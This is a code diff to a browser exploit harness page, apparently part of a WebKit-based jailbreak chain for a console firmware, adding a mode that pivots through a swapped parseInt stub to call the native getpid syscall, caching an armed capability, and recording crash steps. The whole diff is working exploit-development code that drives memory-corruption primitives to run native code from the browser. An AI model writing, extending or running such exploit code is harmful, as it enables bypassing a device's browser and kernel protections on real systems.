@@ -10,10 +10,11 @@ import {
 } from "./libkernel_resolve.js";
 import {
     fireStubSwapParseInt, fireCollatorStub, pinCollatorStub,
-    STUB_LAST_STEP_KEY,
-} from "./stub_call.js?v=stub-6";
+    STUB_LAST_STEP_KEY, loadStubCap,
+} from "./stub_call.js?v=stub-7";
+import { fireG0Smoke, fireG0Getpid, disarmStubG0, resetG0Prep } from "./stub_g0_fire.js?v=stub-g0-1";
 
-const BUILD = "stub-page-6";
+const BUILD = "stub-page-7";
 const params = new URLSearchParams(location.search);
 let lines = [], ready = false, busy = false, collatorPin = null;
 const retain = [];
@@ -191,6 +192,12 @@ function lkFromInput() {
     return p.sub32(0x13b20);
 }
 
+function stubFireMode() {
+    const q = params.get("stubfire") || "g0getpid";
+    if (q === "direct" || q === "g0" || q === "g0getpid" || q === "smoke") return q;
+    return "g0getpid";
+}
+
 function stubMode() {
     const q = params.get("stub");
     if (q === "collator" || q === "arm" || q === "fire") return q;
@@ -198,12 +205,15 @@ function stubMode() {
 }
 
 function stubOpts() {
+    const cached = (typeof window !== "undefined" && window._stubCap) || loadStubCap();
     return {
         log: log,
         flush: flushLog,
         stubKind: params.get("stubkind") || "syscall",
         useTextarea: params.get("arg") === "ta",
         carrier: window._wkCarrier || null,
+        retain: retain,
+        reuseCap: cached,
         preTrim: function () {
             try { trimExploitDebris(); } catch (_) { }
         },
@@ -221,6 +231,10 @@ function syncRadios() {
     const m = stubMode();
     document.querySelectorAll('input[name="stub"]').forEach(function (el) {
         el.checked = el.value === m;
+    });
+    const fm = stubFireMode();
+    document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
+        el.checked = el.value === fm;
     });
 }
 
@@ -297,6 +311,7 @@ function runArm() {
         const off = loadEffectiveOff();
         log("ARM-TAP", "lk=" + lk);
         const r = fireStubSwapParseInt(window.p, off, lk, Object.assign({}, stubOpts(), { armOnly: true }));
+        window._stubCap = { mainMf: r.mainMf, mainOrig: r.mainOrig, nativeFn: r.mainOrig, path: "armed" };
         log("ARM-OK", r.stubTag + " mainMf=" + r.mainMf + " — parseInt restored");
         state("arm OK — Fire uses parseInt(1)", "ok");
     } catch (e) {
@@ -310,11 +325,17 @@ function runArm() {
 
 function runFire() {
     if (busy || !ready || !window.p) return;
-    const lk = lkFromInput();
-    if (!lk) { log("SKIP", "paste lk"); state("need lk", "bad"); flushLog(); return; }
     const mode = stubMode();
+    const fireMode = (mode === "arm") ? "arm" : stubFireMode();
+    const lk = lkFromInput();
+    if (fireMode !== "g0" && fireMode !== "smoke" && !lk) {
+        log("SKIP", "paste lk or run 2e");
+        state("need lk", "bad");
+        flushLog();
+        return;
+    }
     busy = true;
-    log("FIRE-TAP", mode + " lk=" + lk);
+    log("FIRE-TAP", mode + " fire=" + fireMode + (lk ? " lk=" + lk : ""));
     flushLog();
     try {
         const p = window.p;
@@ -331,12 +352,25 @@ function runFire() {
             state("collator done", "ok");
             return;
         }
+        if (fireMode === "g0" || fireMode === "smoke") {
+            fireG0Smoke(p, off, opts);
+            log("G0-SMOKE-OK", "parseInt(1) survived — pivot entry OK");
+            state("G0 smoke OK", "ok");
+            return;
+        }
+        if (fireMode === "g0getpid") {
+            const r = fireG0Getpid(p, off, lk, opts);
+            log("G0-GETPID-OK", "pid=" + r.pid);
+            state(r.pid > 0 ? "getpid " + r.pid : "errno " + r.pid, r.pid > 0 ? "ok" : "warn");
+            return;
+        }
+        log("STUB-WARN", "direct stub OOM expected on 13.52 — use ?stubfire=g0getpid");
         const r = fireStubSwapParseInt(p, off, lk, opts);
         log("STUB-OK", r.stubTag + " arg=" + r.fireArg + " js=" + r.result);
         state("survived js=" + r.result, "ok");
     } catch (e) {
         log("STUB-FAIL", (e.message || String(e)) + (e.stack ? "\n" + e.stack : ""));
-        state("stub failed — reload, read LAST-CRASH-STEP", "bad");
+        state("failed @ " + (sessionStorage.getItem(STUB_LAST_STEP_KEY) || "?"), "bad");
     } finally {
         busy = false;
         flushLog();
@@ -346,7 +380,7 @@ function runFire() {
 function init() {
     crashLog.startAutoFlush();
     showLastCrashStep();
-    log("INIT", BUILD + " — logs in wk-stub-log sessionStorage");
+    log("INIT", BUILD + " fire=" + stubFireMode() + " — direct stub OOMs; default g0getpid");
     flushLog();
     syncRadios();
     document.querySelectorAll('input[name="stub"]').forEach(function (el) {
@@ -355,6 +389,19 @@ function init() {
             u.searchParams.set("stub", el.value);
             location.href = u.pathname + "?" + u.searchParams.toString();
         });
+    });
+    document.querySelectorAll('input[name="stubfire"]').forEach(function (el) {
+        el.addEventListener("change", function () {
+            const u = new URL(location.href);
+            u.searchParams.set("stubfire", el.value);
+            location.href = u.pathname + "?" + u.searchParams.toString();
+        });
+    });
+    window.addEventListener("beforeunload", function () {
+        try {
+            if (window.p) disarmStubG0(window.p);
+        } catch (_) { }
+        crashLog.flushSync();
     });
     $("btn-start").onclick = runStart;
     $("btn-2e").onclick = function () { run2e(); };
